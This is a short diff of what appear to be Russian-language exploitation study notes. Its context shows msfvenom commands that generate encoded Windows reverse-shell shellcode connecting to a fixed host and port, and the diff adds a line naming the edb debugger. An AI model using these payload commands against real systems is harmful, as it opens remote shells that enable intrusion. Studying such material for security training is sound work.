@@ -82,3 +82,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 EXITFUNC=thread
 
 А что бы приложение не падало нужно сделать следующее:
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+edb - debugger for linux
